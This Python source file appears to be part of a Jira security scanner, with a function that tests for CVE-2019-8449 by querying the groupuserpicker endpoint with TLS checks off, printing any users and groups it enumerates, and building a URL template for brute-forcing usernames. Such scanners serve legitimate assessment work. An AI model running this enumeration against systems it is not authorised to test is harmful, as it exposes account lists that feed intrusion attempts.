import requests
from urllib.parse import urlparse
import colorama
from colorama import Fore, Style
import time
import os
import sys
import json
from urllib.parse import urlparse
import urllib3

# Check for CVE-2019-8449
def check_cve_2019_8449(url):
    cve_2019_8449_url = f"{url}rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true"
    cve_2019_8449_brute = f"{url}rest/api/latest/groupuserpicker?query=<usernametoguess>&maxResults=50000&showAvatar=true"

    vulnerabilities = ''
    
    try:
        print(f"\n{Fore.YELLOW}INFO: Checking for CVE-2019-8449{Style.RESET_ALL}")
        response = requests.get(cve_2019_8449_url, verify=False)

        # Check for the vulnerability and parse the response
        if response.status_code == 200 and "users" in response.text:
            vulnerabilities += (f"+ [Username Enumeration] CVE-2019-8449: The /rest/api/latest/groupuserpicker resource in Jira before version 8.4.0 allows remote attackers to enumerate usernames. | URL : {cve_2019_8449_url}")

            data = response.json()
            users = data.get("users", {}).get("users", [])
            total_users = data.get("users", {}).get("total", "N/A")
            user_header = data.get("users", {}).get("header", "N/A")

            groups = data.get("groups", {}).get("groups", [])
            total_groups = data.get("groups", {}).get("total", "N/A")
            group_header = data.get("groups", {}).get("header", "N/A")

            print(f"\n{Fore.GREEN}+ [Username Enumeration] CVE-2019-8449 Detected{Style.RESET_ALL}")
            print(f"  URL: {cve_2019_8449_url}")
            print(f"  URL: {cve_2019_8449_brute}")
            print(f"  Total Users Found: {total_users}")
            print(f"  User Header: {user_header}")
            print(f"  User Details: {users if users else 'No users listed.'}")
            print(f"  Total Groups Found: {total_groups}")
            print(f"  Group Header: {group_header}")
            print(f"  Group Details: {groups if groups else 'No groups listed.'}")
        elif response.status_code == 403:
            print(f"{Fore.YELLOW}\n- No CVE-2019-8449 vulnerability detected on: {cve_2019_8449_url}{Style.RESET_ALL}")

        else:
            print(f"{Fore.YELLOW}\n- No CVE-2019-8449 vulnerability detected on: {cve_2019_8449_url}{Style.RESET_ALL}")
    except json.JSONDecodeError:
        print(f"{Fore.RED}- Failed to parse JSON response from: {cve_2019_8449_url}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}- An error occurred while checking {cve_2019_8449_url} error:{e}{Style.RESET_ALL}")
    return vulnerabilities